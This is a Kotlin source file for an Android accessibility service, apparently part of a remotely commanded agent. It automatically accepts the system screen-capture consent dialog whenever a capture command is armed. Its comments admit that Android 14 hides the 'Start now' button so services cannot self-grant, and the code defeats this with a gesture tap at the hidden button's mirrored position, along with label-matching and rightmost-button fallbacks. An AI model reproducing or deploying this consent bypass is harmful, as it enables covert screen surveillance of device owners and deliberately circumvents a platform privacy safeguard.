package com.wormgitty.agent

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

/**
 * Accessibility service: passive presence for the wizard gate, plus ONE
 * active duty — auto-accepting our own MediaProjection consent dialog while
 * a screen-capture command is armed. It never touches other apps' dialogs.
 */
class WormA11yService : AccessibilityService() {

    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
    private var poller: Runnable? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        connected = true
        startPoller()
    }

    /**
     * The consent dialog can already be resumed when we arm (a stale instance
     * left by an earlier attempt produces no window event), so in addition to
     * the event path we poll the active window every 250ms while armed.
     */
    private fun startPoller() {
        val r = object : Runnable {
            override fun run() {
                if (ProjectionClickBus.armed) tryClickConsent()
                handler.postDelayed(this, 250)
            }
        }
        poller = r
        handler.postDelayed(r, 250)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!ProjectionClickBus.armed) return
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event?.eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return
        tryClickConsent()
    }

    private var ticks = 0

    private fun tryClickConsent() {
        val diag = ++ticks % 20 == 0
        val root = rootInActiveWindow
        var wins = emptyList<android.view.accessibility.AccessibilityWindowInfo>()
        runCatching { wins = windows }
        if (diag) {
            Log.i(
                "WormA11y",
                "tick armed=${ProjectionClickBus.armed} rootPkg=${root?.packageName}" +
                    " rootKids=${root?.childCount} wins=${wins.size} " +
                    wins.joinToString(";") { "${it.id}:${it.root?.packageName}/k${it.root?.childCount}" }
            )
        }
        var target = findConsentTarget(root)
        if (target == null) {
            // Active window may be our own translucent activity — scan all.
            for (w in wins) {
                target = findConsentTarget(w.root)
                if (target != null) break
            }
        }
        if (target == null) {
            // API 34 hardening (verified on sdk_gphone64 AVD): SystemUI's
            // MediaProjectionPermissionActivity exposes title, warning text
            // and "Cancel" to a11y but WITHHOLDS the "Start now" node
            // (findById android:id/button1 -> 0, findByText "Start now" -> 0)
            // so services can't self-grant. The button still occupies the
            // row slot mirrored across Cancel — tap it by gesture.
            if (root != null) tryMirrorTap(root)
            if (root == null) for (w in wins) w.root?.let { tryMirrorTap(it) }
            return
        }
        val r = Rect(); target.getBoundsInScreen(r)
        Log.i("WormA11y", "consent target text=${target.text} id=${target.viewIdResourceName} bounds=$r")
        val ok = target.performAction(AccessibilityNodeInfo.ACTION_CLICK) || clickAtCenter(target)
        if (ok) {
            ProjectionClickBus.armed = false
            val visibleMs = System.currentTimeMillis() - ProjectionClickBus.armedAt
            Log.i("WormA11y", "projection consent auto-accepted visibleMs=$visibleMs")
        }
    }

    /**
     * Classic dialog (verified API34 google_apis + <=33): "Start now" at
     * android:id/button1 (right), "Cancel" at button3 (left).
     * Some API34 builds show a chooser with "Share entire screen"/"Share a
     * single app" cards + "Share" — handled by the label list + the
     * rightmost-clickable fallback (positive button is always rightmost).
     */
    private fun findConsentTarget(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) return null
        // 1. Explicit confirm resource id (positive button on classic dialog).
        val byId = root.findAccessibilityNodeInfosByViewId("android:id/button1")
            .firstOrNull()
        if (byId != null) return byId
        // 2. Exact confirm labels — clickable not required: the gesture tap at
        //    the node's bounds covers TextView-inside-Button cases.
        for (label in CONFIRM_LABELS) {
            val hit = root.findAccessibilityNodeInfosByText(label)
                .firstOrNull { it.text?.toString() == label }
            if (hit != null) return hit
        }
        // 3. Chooser layout: reselect the entire-screen card if present.
        for (label in ENTIRE_LABELS) {
            val hit = root.findAccessibilityNodeInfosByText(label)
                .firstOrNull { it.isClickable || it.isEnabled }
            if (hit != null) return hit
        }
        // 4. Dialog is still inflating (Cancel laid out, confirm not yet
        //    clickable) — do NOT click anything; the next poll retries.
        if (root.findAccessibilityNodeInfosByText("Cancel").isNotEmpty() ||
            root.findAccessibilityNodeInfosByViewId("android:id/button3").isNotEmpty())
            return null
        // 5. Fallback only when the window looks like the consent dialog —
        //    never click arbitrary screens while armed.
        if (root.findAccessibilityNodeInfosByText("cast").isEmpty() &&
            root.findAccessibilityNodeInfosByText("record").isEmpty() &&
            root.findAccessibilityNodeInfosByText("screen").isEmpty()) return null
        val clickables = mutableListOf<AccessibilityNodeInfo>()
        fun walk(n: AccessibilityNodeInfo?) {
            if (n == null) return
            if (n.isClickable) clickables += n
            for (i in 0 until n.childCount) walk(n.getChild(i))
        }
        walk(root)
        val rootH = Rect().also { root.getBoundsInScreen(it) }.height()
        return clickables
            .filter { Rect().also { r -> it.getBoundsInScreen(r) }.top > rootH / 2 }
            .maxByOrNull { Rect().also { r -> it.getBoundsInScreen(r) }.left }
            ?: clickables.lastOrNull()
    }

    /** Last mirror-tap time — re-allowed after 1.5s while still armed. */
    private var lastMirrorTapAt: Long = 0L

    /**
     * Consent dialog with a masked positive button (API34): requires the
     * dialog fingerprint (Cancel node + consent wording) so we never tap an
     * arbitrary screen. The positive button sits in the button row mirrored
     * horizontally across Cancel; tap is dispatched once per armed session.
     */
    private fun tryMirrorTap(root: AccessibilityNodeInfo) {
        if (System.currentTimeMillis() - lastMirrorTapAt < 1500) return
        val cancel = root.findAccessibilityNodeInfosByViewId("android:id/button3")
            .firstOrNull()
            ?: root.findAccessibilityNodeInfosByText("Cancel")
                .firstOrNull { it.isClickable }
            ?: return
        val consentish = root.findAccessibilityNodeInfosByText("record").isNotEmpty() ||
            root.findAccessibilityNodeInfosByText("casting").isNotEmpty() ||
            root.findAccessibilityNodeInfosByText("screen").isNotEmpty()
        if (!consentish) return
        val row = Rect().also { cancel.parent?.getBoundsInScreen(it) ?: cancel.getBoundsInScreen(it) }
        val cr = Rect().also { cancel.getBoundsInScreen(it) }
        if (row.isEmpty || cr.isEmpty) return
        val tapX = row.right - (cr.centerX() - row.left)
        val tapY = cr.centerY()
        lastMirrorTapAt = System.currentTimeMillis()
        val path = Path().apply { moveTo(tapX.toFloat(), tapY.toFloat()) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 80))
            .build()
        val visibleMs = System.currentTimeMillis() - ProjectionClickBus.armedAt
        Log.i("WormA11y", "masked-confirm gesture tap x=$tapX y=$tapY visibleMs=$visibleMs")
        dispatchGesture(gesture, null, null)
    }

    private fun clickAtCenter(node: AccessibilityNodeInfo): Boolean {
        val r = Rect()
        node.getBoundsInScreen(r)
        if (r.isEmpty) return false
        val path = Path().apply { moveTo(r.centerX().toFloat(), r.centerY().toFloat()) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 80))
            .build()
        return dispatchGesture(gesture, null, null)
    }

    override fun onInterrupt() {
        // No-op.
    }

    override fun onDestroy() {
        connected = false
        super.onDestroy()
    }

    companion object {
        @Volatile
        var connected: Boolean = false

        private val CONFIRM_LABELS = arrayOf("START NOW", "Start now", "Share", "SHARE")
        private val ENTIRE_LABELS = arrayOf("Share entire screen", "Entire screen")
    }
}

/**
 * Arming switch for the projection auto-accept. CommandLink arms it right
 * before launching ConsentActivity and disarms when the consent flow settles,
 * so the service never clicks an unsolicited dialog.
 */
object ProjectionClickBus {
    @Volatile var armed: Boolean = false
    @Volatile var armedAt: Long = 0L
}
